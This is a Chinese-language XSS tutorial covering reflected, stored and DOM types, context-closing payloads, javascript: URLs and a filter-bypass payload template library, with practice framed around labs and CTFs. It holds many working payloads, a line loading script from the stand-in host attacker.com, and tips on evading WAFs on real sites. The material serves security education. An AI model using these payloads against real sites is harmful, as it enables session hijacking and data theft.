## [g-basic] XSS 基础与类型——掌握三种 XSS 的触发位置与区别，是后续所有利用的起点

### [basic-types] 反射/存储/DOM 三类型对比 | easy | xss;dom-xss;reflected;stored | 反射型;存储型;DOM型
> 同一段注入代码，因为触发位置与存储方式不同，被划分为三种类型，检测与利用思路完全不同。

#### 这个条目的作用
把 XSS 拆成三种类型讲清楚：同一句 `<script>alert(1)</script>`，放在搜索框、放在留言板、放在 URL 的 `#` 后面，分别是三种不同的漏洞。学会"看现象判类型"，才能选对后续的利用链。

#### 前置条件
- 一个能测的靶场（DVWA 低难度、pikachu 或任意 CTF 题）
- 浏览器 F12（F12 → Console / Network 面板会用）
- 理解一个基本概念：**响应体** = 服务器返回给浏览器的原始 HTML，在 F12 → Network → 点请求 → Response 标签里能看到

#### 第 1 步：测反射型——拿搜索框开刀
操作：打开任意有搜索功能的页面（如 `http://靶场/search.php?q=test`），把搜索词改成 `test123`，提交。
观察：F12 → Network → 刷新 → 点开 `search.php` 请求 → Response 标签里搜 `test123`。
预期结果：`test123` 原样出现在响应 HTML 里，比如 `<h1>结果: test123</h1>`。**payload 只在你这次请求里出现，刷新/换人访问就没有了** → 反射型。
如果不行：响应里 `test123` 被转义成 `test123` 或变成 `test%20123`，说明输出被编码或 URL 编码，先解码或换注入点。

#### 第 2 步：测存储型——换留言板/昵称
操作：找评论、留言、昵称修改这类"提交后保存"的功能。在内容框里填 `<b>hacked</b>` 提交。
观察：**换一个浏览器或开无痕窗口**重新打开评论列表页/个人主页。
预期结果：别的页面、别的用户访问时依然能看到加粗的 `hacked`，说明输入被存进数据库并原样渲染 → 存储型。特征是"一次提交，处处触发，重启浏览器还在"。
如果不行：显示的是 `<b>hacked</b>` 纯文本（尖括号被转义），说明服务端转义了 `<>`，存储型这条路被堵，转 DOM 型思路。

#### 第 3 步：测 DOM 型——payload 藏在 # 后面
操作：找一个读 `location.hash` 的页面（CTF 常给源码提示；没有就找 SPA 或带锚点渲染的页面）。在地址栏 URL 末尾追加 `#<img src=x onerror=alert(1)>`，回车。
观察：F12 → Network 里看这次请求的响应体。
预期结果：**响应体里完全看不到** `<img` 字样（服务器根本没收到 hash 部分），但页面弹了 alert 或 DOM 变化 → DOM 型。特征："响应体无 payload，但浏览器内执行"。
如果不行：没弹窗，说明页面 JS 没把 hash 写进 HTML（sink 不对），需要看源码找 `location.hash` / `innerHTML` 的赋值链（见 g-dom 分组）。

#### 第 4 步：对照指纹表确认类型
| 现象 | 类型 | 下一步动作 |
|---|---|---|
| payload 只在本请求回显 | 反射型 | 找闭合点直接利用 |
| payload 存库、他人访问触发 | 存储型 | 找渲染页面，可打管理员 |
| 响应体无 payload、浏览器内执行 | DOM 型 | 审计前端 source→sink |
| 三招都试了没触发 | 被过滤/转义 | 看 g-bypass 分组做编码绕过 |

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 测 DOM 型时 Network 里看到 payload | 页面用的是 `location.search`（`?` 部分）而非 hash | 用 `?` 参数重试，或确认 source 类型 |
| 存储型测试在无痕窗口不显示 | 评论需要审核/仅本人可见 | 换昵称字段或开第二个账号互看 |
| 反射型一刷新就消失，以为没漏洞 | 反射型本就一次性，这正是特征 | 每次注入都要带 payload 重新请求 |
| 三种都判定为"没漏洞" | 大概率被输出编码 | 先用 `<>"'` 四个字符探测过滤规则 |

#### 实战要点
- 检测顺序固定：先看响应体回显（反射/存储），再看是否存库，最后才动前端 JS——反射型最容易先跑通闭环。
- 存储型危害最大（可打管理员），DOM 型最难发现但最常出现在 SPA 靶场。
- 同一 payload 三处都弹窗？说明站点多处没防护，按存储型优先上报。
- 判定类型时以"响应体是否含 payload、是否持久化"两条为准，不要靠猜。

### [basic-detect-payloads] 检测 payload 全集 | easy | xss;payload;detect | 测试payload;验证payload
> 用最小的无害 payload 证实注入点存在，再用替换字符定位过滤规则，是 XSS 挖掘的标准节奏。

#### 这个条目的作用
提供一套"先用小 payload 证明能执行，再探测过滤规则"的标准流程。检测的目标不是立刻打死，而是回答两个问题：**能不能注入？被过滤了什么？**

#### 前置条件
- 一个目标注入点（搜索框 / 参数 / 评论区任一即可）
- Burp Suite 或浏览器 F12 都行；能看响应原文即可
- 知道用 `alert(1)` 弹窗作为"执行成功"的信号

#### 第 1 步：先打一个无害标记，确认回显位置
操作：向注入点提交 `zzq12345`（任意唯一字符串）。
观察：F12 → Network → 响应里搜 `zzq12345`。
预期结果：找到它出现的位置和包裹结构（`<div>` 里？`value="..."` 里？URL 里？）。找不到就说明参数没回显，换注入点。
如果不行：回显被编码（`&lt;` 之类），记住编码形式，后面按编码层绕过。

#### 第 2 步：上最小弹窗三连
操作：把 `zzq12345` 依次替换为下面三个 payload，每次提交后看是否弹窗：
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```
预期结果：任意一个弹窗 = 注入点成立，且能推断过滤情况——`<script>` 被过滤但 `img` 弹了 → 只挡了 script 标签；三个都弹 → 无过滤，直接上利用 payload。
如果不行：三个都没弹，但回显里能看到 payload 原文 → 过滤或位置问题，进第 3 步。

#### 第 3 步：字符探测集，摸清过滤规则
操作：逐个提交下面这串字符，观察哪些被删、哪些被编码、哪些原样：
```text
< > " ' / \ ( ) ; = javascript alert onerror
```
观察：响应里逐个对比。`<` 没了 → 尖括号被删；`javascript` 变成 `jav%61script` → 关键字被替换/编码。
预期结果：得到一张"过滤清单"，据此选绕过方向（编码、事件、大小写，见 g-bypass）。
如果不行：全部原样 → 无字符级过滤，问题只剩闭合上下文，直接做闭合。

#### 第 4 步：预闭合 payload，一次探测多个字符
操作：直接提交这一条，观察弹没弹：
```html
"><svg/onload=alert(1)>
```
预期结果：弹窗 = 双引号没被过滤、尖括号可用、且注入点在属性内（成功闭合了属性又开了新标签）。一次请求顶三次探测。
如果不行：没弹，看响应里 `"` 是否被删除或编码——被删则换单引号版 `'><svg/onload=alert(1)>` 重试。

#### 第 5 步：确认是"执行"而不是"回显"
操作：弹窗后，打开 F12 → Console，输入 `document.domain` 回车。
预期结果：输出目标域名，证明 JS 在目标域上下文执行。若弹窗内容是你注入的字符串而非 alert 数字，说明只是回显文本，不算执行。
如果不行：Console 报跨域错误或输出的是空 → 检查是否被 CSP 拦截（见 g-bypass 的 CSP 部分）。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| payload 回显了但不弹窗 | 输出被转义成文本 | 看响应里是否多了 `&lt;`，走编码绕过 |
| `<script>` 被删但 img 弹窗 | 黑名单只挡 script | 直接用事件属性，别再纠结 script |
| 弹窗内容显示 `<script>...` 字符串 | 注入进了 JS 字符串而非 HTML | 判定上下文，做闭合（见 basic-contexts） |
| 本地能弹、靶场不弹 | 靶场有 WAF 或过滤更严 | 用字符探测集逐项测，别盲试完整 payload |

#### 实战要点
- 检测阶段永远用无害 payload（alert(1) 或弹 document.domain），别一上来就盗 cookie，容易被封。
- 顺序：标记字符串 → 三连弹窗 → 字符探测 → 预闭合，任何一步成功就停，别浪费请求。
- `"><svg/onload=alert(1)>` 是最值钱的单条 payload：同时探测引号、尖括号、事件触发三个维度。
- 把每个 payload 的"响应原文"截图存档，报告时证明过滤与绕过路径。

### [basic-contexts] 闭合场景速查 | medium | xss;context;payload | 闭合;上下文
> 注入点落在标签内、属性内、注释内还是 script 里，决定了 payload 的结构，先判定上下文再写 payload。

#### 这个条目的作用
XSS payload 不是"往里一贴就完事"，必须先把包裹它的 HTML 结构"关掉"再注入自己的代码。本条目教你先判定上下文、再套对应闭合公式。

#### 前置条件
- 一个已确认能注入、但裸 payload 不生效的注入点
- 能看到响应原文（F12 → Network → Response）
- 记住通用公式：**闭合符 + 注入本体 + 注释/引号收尾**

#### 第 1 步：先看回显，判定上下文
操作：提交 `INJECT` 四个字母，在响应原文里找到它，往前看 50 字符、往后看 50 字符。
观察：它被什么包着？`<div>INJECT</div>`（标签间）、`value="INJECT"`（双引号属性）、`value='INJECT'`（单引号属性）、`<!-- INJECT -->`（注释）、`var x='INJECT';`（script 内）。
预期结果：判定出五种上下文之一，查下表选 payload。
如果不行：回显被编码 → 先解决编码（g-bypass），编码不解决谈闭合没意义。

#### 第 2 步：标签间上下文——直接插新标签
场景回显：`<div>INJECT</div>`
操作：提交：
```html
<script>alert(1)</script>
```
预期结果：弹窗。因为 `div` 之间可以直接插入新标签，无需闭合。
如果不行：script 被过滤，换 `<img src=x onerror=alert(1)>`（事件触发不依赖 script 标签）。

#### 第 3 步：双引号属性——闭合引号再闭合标签
场景回显：`<input value="INJECT">`
操作：提交：
```html
"><svg onload=alert(1)>
```
拆解：第一个 `"` 关掉 value 的值，`>` 关掉 input 标签，然后 `<svg onload=alert(1)>` 是新标签。
预期结果：弹窗。
如果不行：没弹且响应里 `"` 没了 → 双引号被过滤，试单引号版 `'><svg onload=alert(1)>`，或改走事件属性 `" autofocus onfocus=alert(1) x="`（不闭合标签也能触发）。

#### 第 4 步：单引号属性——闭合单引号即可
场景回显：`<input value='INJECT'>`
操作：提交：
```html
' onmouseover='alert(1)
```
拆解：第一个 `'` 关掉 value，后面 ` onmouseover='alert(1)` 追加事件属性，末尾 `'` 让属性值配对不报错。
预期结果：鼠标悬停输入框时弹窗。
如果不行：没反应 → 看响应里单引号是否被转义（`\'`），被转义则先绕过转义（双写 `\\'` 或编码）。

#### 第 5 步：注释内与 script 内——先关注释/字符串
注释场景 `<!-- INJECT -->`，提交：
```html
--><script>alert(1)</script>
```
script 场景 `var x = 'INJECT';`，提交：
```javascript
';alert(1);//
```
拆解：`-->` 提前关闭注释；`';` 关掉字符串并结束语句，`//` 注释掉尾部 `';`。
预期结果：分别弹窗。
如果不行：script 内场景记得收尾符必须用 `//` 或 `/* */`，漏了会语法报错不执行。

#### 第 6 步：无引号属性——空格即分隔符
场景回显：`<input value=INJECT>`（属性值没引号）
操作：提交：
```html
value=INJECT onmouseover=alert(1) x=y
```
预期结果：悬停弹窗。因为无引号属性以空格为界，追加的 ` onmouseover=...` 直接成为新属性。
如果不行：没弹 → 空格可能被过滤（换成制表符 `\t` 或换行再试，见 g-bypass 空白符替换）。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 双引号属性用了 `<script>` 裸插 | 没闭合属性，script 成了属性值 | 先 `">` 再插标签 |
| 闭合成功但整页 JS 报错不弹 | script 内注入漏了收尾注释 | 结尾必须 `//` 或 `/* */` |
| 单引号被转义成 `\'` | 服务端转义引号 | 双写 `\\'` 或换无引号/事件思路 |
| 弹了但只有第一次生效 | 上下文判断错，实际在别的包裹里 | 严格看响应原文，别凭想象 |

#### 实战要点
- 判定优先级：先看最近闭合字符是 `>` 还是引号；属性内优先事件属性（不用闭合标签），标签间优先新标签。
- 五种上下文的 payload 背熟：`<script>alert(1)</script>`、`"><svg onload=alert(1)>`、`' onmouseover='alert(1)`、`--><script>alert(1)</script>`、`';alert(1);//`。
- 一个 payload 不生效先别换思路，先改"闭合符"，再改"注入本体"。

## [g-reflected] 反射型 XSS 挖掘——参数进响应即反射，挖掘核心是定位拼接点与闭合上下文

### [ref-context-close] 上下文确认与闭合构造 | medium | xss;reflected;context | 反射闭合
> 反射型 XSS 的灵魂是"参数原样出现在响应体"，用正则式思维找出回显位置外层包裹，逐层闭合。

#### 这个条目的作用
反射型 XSS 的完整挖掘流程：用一个唯一标记找到参数在响应里的回显位置，看清外层包裹，再按包裹结构一层层闭合构造 payload。这是反射型最核心的技能。

#### 前置条件
- 目标站点的搜索框/任意 GET 参数
- Burp Suite（用 Repeater 反复改包最快）或 F12 的 Network 面板
- 会用 basic-contexts 的五种上下文表

#### 第 1 步：发一个唯一标记参数
操作：Burp Repeater 里发（或用浏览器直接访问）：
```http
GET /search?q=marker7x9 HTTP/1.1
Host: target.com
```
预期结果：请求成功返回页面。`marker7x9` 是你专用的唯一字符串，之后在响应里搜它就等于找到了注入点。
如果不行：状态码 4xx/5xx → 参数名不对，先在正常搜索里抓包看真实参数名（可能是 `kw`、`keyword`）。

#### 第 2 步：在响应里检索标记，观察包裹结构
操作：Repeater 的 Response 里 Ctrl+F 搜 `marker7x9`。
观察：它前后的 HTML 是什么？例如：
```html
<h1>SEARCH: marker7x9</h1>
```
或：
```html
<input name="kw" value="marker7x9">
```
预期结果：判断出是"标签间"还是"属性内"，进而决定闭合符。
如果不行：搜不到 → 参数没被回显（可能被服务端重定向或参数名不同），换参数重试；搜到但变成 `marker7x9`（编码）→ 先处理编码层。

#### 第 3 步：按包裹结构套闭合模板
操作：对照下面模板选一条提交：
```html
<!-- 场景：<h1>SEARCH: q</h1> —— 标签间，直接插 -->
<script>alert(1)</script>

<!-- 场景：<input name="kw" value="q"> —— 双引号属性，闭合 -->
"><svg onload=alert(1)>

<!-- 场景：<a href="result?q=q"> —— URL 属性，闭合后加事件 -->
" onclick="alert(1)
```
预期结果：弹窗或点击触发。第三条提交后响应应变成 `<a href="result?q=" onclick="alert(1)">`，点链接即弹窗。
如果不行：逐层试——先只试 `"` 看引号是否被吃，再试 `>` 看尖括号是否被吃，哪层被吃就在哪层换绕过。

#### 第 4 步：URL 内反射先确认解码
操作：如果回显在 URL 属性里（`href="?q=q"`），先把参数值改成 `%22%3E`（即 `">` 的 URL 编码），观察响应。
预期结果：响应里出现 `"` `>` 原文 → 服务端先 URL 解码再拼接，编码层不构成障碍，可以正常闭合。
如果不行：响应里仍是 `%22%3E` 原样 → 服务端不解码，URL 编码层已天然阻断闭合，此时 `javascript:` 伪协议也会失效，换注入点。

> [!danger]
> 反射点在 URL 内时，空格与引号会被 URL 编码。先确认服务端是否解码回显，解码后才考虑 `javascript:`，否则一切闭合都是徒劳。

#### 第 5 步：用 Burp Repeater 快速迭代
操作：把参数值固定在 Repeater 里，改一次 payload → Send → 看 Response 里的渲染结果，循环。
预期结果：3-5 次内找到可执行 payload。每次改动只改一个变量（先闭合符、再注入体），避免"改了三个地方不知道哪步生效"。
如果不行：反复失败说明可能有 WAF/过滤，转 g-bypass 分组按"编码→事件→变体→截断"逐层升级。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 搜不到标记字符串 | 参数名错或值被服务端改写 | 抓真实请求对比参数名 |
| 标记被编码显示 | 输出转义 | 先做编码绕过再闭合 |
| 闭合符 `"` 被删除 | 引号被过滤 | 换单引号/无引号场景或双写转义 |
| payload 弹了但点链接才触发 | 注入在 href 里 | 用事件属性 `" onclick=` 或确认触发条件 |

#### 实战要点
- 第一步永远是唯一标记字符串，别直接用 payload 当标记，否则回显位置和过滤情况混在一起看不清。
- 闭合公式：**闭合符 + 注入本体 + 注释/引号收尾**，一次只改一层。
- 反射型一次请求一次触发，验证时每个 payload 都要重新带参请求，别指望刷新复用。
- 响应原文是唯一真相：一切判断基于 Response 里实际渲染出的结构，不要用浏览器渲染结果猜。

### [ref-attr-javascript-url] 属性注入与 javascript: URL | easy | xss;attribute;javascript;url | href注入;伪协议
> 当注入点落在可点击属性（href/src/action）内，可以用伪协议直接执行脚本，也可用事件属性触发。

#### 这个条目的作用
注入点如果在 `href`、`src`、`action` 这类"点了会跳转/加载"的属性里，有两条利用路线：`javascript:` 伪协议直接执行，或追加事件属性免点击触发。本条目把两条路线和各自的坑讲清楚。

#### 前置条件
- 已确认注入点在某标签的可点击属性内（回显如 `<a href="INJECT">`）
- 浏览器地址栏能访问构造好的 URL（直接粘 payload 即可）

#### 第 1 步：确认注入点在可点击属性里
操作：提交标记 `abc`，在响应里看它是否出现在 `href="abc"` / `src="abc"` / `action="abc"` 里。
预期结果：确认是 URL 型属性。这三种属性都会把值当 URL 处理，是伪协议的天然入口。
如果不行：标记出现在 `value="..."` 或文本里 → 不是 URL 属性，走 basic-contexts 的其他闭合路线。

#### 第 2 步：javascript: 伪协议直接打
操作：把注入值替换为：
```html
javascript:alert(1)
```
触发：点击该链接（或访问 iframe/form 自动加载）时弹窗。
完整形态对照：
```html
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">
<form action="javascript:alert(1)"><input type=submit>
```
预期结果：点击后地址栏不跳转、直接执行 `alert(1)` 弹窗。
如果不行：点了没反应 → 服务端过滤了 `javascript:` 关键字（见第 4 步变体），或浏览器对 `iframe src=javascript:` 已收窄（现代浏览器基本都拦，优先用 `<a>` 和事件属性）。

#### 第 3 步：事件属性免点击触发
操作：如果伪协议被拦，或想"不点也能触发"，改用事件属性。先闭合当前属性再追加事件：
```html
"><svg onload=alert(1)>
```
纯事件形态（无引号时直接追加）：
```html
<input value="x" onfocus=alert(1) autofocus>
<a href="x" onmouseover="alert(1)">hover</a>
<img src="x" onerror="alert(1)">
```
预期结果：`onerror`/`onload` 零交互自动触发；`onfocus` 配合 `autofocus` 页面加载即触发；`onmouseover` 需要悬停。
如果不行：事件属性没触发 → 确认你的注入点确实在标签属性里而非 URL 编码状态（第 4 步的编码问题同样影响事件属性）。

#### 第 4 步：javascript: 被过滤时的变体
操作：逐个试下面变体，看哪个能过过滤：
```html
JaVaScRiPt:alert(1)
jav&#x61;script:alert(1)
javascript&colon;alert(1)
```
预期结果：大小写变体骗过只匹配小写的正则；HTML 实体变体在 href 属性里会被浏览器解码为 `javascript:` 再解析。
如果不行：全被拦 → 放弃伪协议，纯用事件属性路线；事件也被拦就转 g-bypass 的编码/混淆组合。

> [!tip]
> 现代浏览器对 `<iframe src=javascript:>` 已收窄，优先用事件属性与 `<a>`。若服务端过滤 `javascript:`，尝试大小写/HTML 实体变体绕过。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| `javascript:alert(1)` 点了不弹 | 关键字被过滤或属性值被 URL 编码 | 试大小写/实体变体，或换事件属性 |
| iframe 方式完全无效 | 现代浏览器禁用 iframe 伪协议 | 换 `<a href>` 或 img onerror |
| 事件属性弹窗但需悬停 | 用了交互事件 | 换 onerror/onload/autofocus 零交互事件 |
| 响应里 `javascript:` 变成 `javascript%3A` | 值被 URL 编码且未解码 | 该注入点走不通，换注入点 |

#### 实战要点
- 优先级：事件属性 > `<a>` 伪协议 > iframe 伪协议（iframe 现代浏览器基本不可用）。
- `onerror` 和 `onload` 不需要任何用户交互，是属性注入的首选触发事件。
- 伪协议被过滤先试大小写（`JaVaScRiPt:`），再试 HTML 实体（`&#x61;`），实体只在 href 属性上下文有效。
- 利用成功后记录触发条件（点击/悬停/自动），报告里写清"受害者需不需要交互"。

### [ref-payload-templates] 常用 payload 模板库 | easy | xss;payload;template | payload模板
> 一套可复用的 payload 模板，覆盖标签、属性、事件、svg 四种触发形态，验证时按过滤情况替换使用。

#### 这个条目的作用
把反射型 XSS 最常用的 payload 整理成可直接复制的模板库。拿到注入点后不用现场想 payload，按"上下文 + 过滤情况"从库里选，改两处就能用。

#### 前置条件
- 已用 basic-contexts 判定好注入上下文（标签间/属性内/script 内）
- 已用 basic-detect-payloads 摸清大概的过滤情况
- 一个能贴 payload 的请求（Burp Repeater 或浏览器地址栏）

#### 第 1 步：按上下文选模板大类
操作：对照判定结果选择：标签间 → 标签类；属性内 → 属性闭合类；什么都被过滤 → svg 变体类；长度受限 → 无引号/截断类。
预期结果：先定大类，再在大类里挑具体 payload，避免瞎试。
如果不行：上下文判不出来 → 回头用标记字符串看响应原文（ref-context-close 第 2 步）。

#### 第 2 步：标签类模板（标签间上下文）
操作：提交：
```html
<script>alert(1)</script>
<script src="//attacker.com/x.js"></script>
```
预期结果：第一条弹窗；第二条会向 `attacker.com` 请求外挂脚本（前提是你有可控的 JS 托管点，本地测试用第一条）。
如果不行：`script` 被过滤 → 跳第 4 步 svg/事件变体，别在同一类里死磕。

#### 第 3 步：属性闭合类模板（属性内上下文）
操作：按引号情况选：
```html
"><img src=x onerror=alert(1)>
'><svg onload=alert(1)>
" autofocus onfocus=alert(1) x="
```
预期结果：前两条闭合后插新标签自动触发；第三条不闭合标签、靠 `autofocus` 聚焦触发，适合"标签被白名单过滤"的场景。
如果不行：注意第三条的收尾 ` x="` 必须有——它把 value 属性补完整，否则 HTML 解析可能吞掉后续内容。

#### 第 4 步：svg 变体与截断类（强过滤/长度受限）
操作：按需替换：
```html
<svg/onload=alert(1)>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
<svg/onload=alert(1)//
<img src=x onerror=alert(1)//
```
预期结果：`<svg/onload=...>` 用"标签名后直接跟事件"的写法绕过"事件前必须有空格/`on` 前后格式"类过滤；`<math>...` 是标签嵌套变体，骗过只匹配单个标签名的黑名单。
`//` 的作用：注释掉后续所有字符，防服务端"尾部补引号/补 `>`"的修复逻辑。
如果不行：整条 payload 太长被截断 → 用超短模板 `<svg onload=alert(1)>`（20 字符内）或 `<img src=x onerror=alert(1)>`（30 字符内）。

#### 第 5 步：按过滤情况逐级替换
操作：遵循升级顺序：原始 payload → 字符探测定位过滤项 → 换事件 → 换变体 → 加 `//` 截断。每换一级只改一个变量并观察响应。
预期结果：某级变体生效弹窗。记录"哪一级生效"，报告里写清过滤规则与绕过路径。
如果不行：全库都试完没弹 → 可能不是纯反射点（被输出编码），转 g-bypass 分组做编码绕过。

> [!warn]
> CTF 与真实站点差异：真实站点需假设 WAF 存在，先在本地用相同 payload 对目标做字符级探测再发包；CTF 无 WAF 时直接一把梭。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| `<script src=//...>` 无反应 | 外挂脚本地址不可达 | 本地测试只用 alert 版，或先确认域名可达 |
| 模板能弹但上报不通过 | 用了 alert 而目标要求更严重利用 | 按题目要求换盗 cookie/外带模板 |
| `//` 截断后整页报错 | 注入点在 JS 里，`//` 把后续真代码也注释了 | script 内场景改用 `/* */` 或精确闭合 |
| payload 过长被截断 | 输入长度限制 | 用最短模板，或把载荷放进 window.name 再 `eval(name)` |

#### 实战要点
- 模板库不是越多越好，四类各背 1-2 条就够：标签、属性闭合、svg 变体、截断。
- `//` 结尾是反射型的万能收尾，遇到"补引号/补标签"的修复逻辑直接破。
- 每条 payload 都标注"适用上下文 + 触发条件"，用时按上下文对号入座。
- 本地靶场把整库全跑一遍，记录每条在哪类过滤下存活，形成自己的绕过对照表。
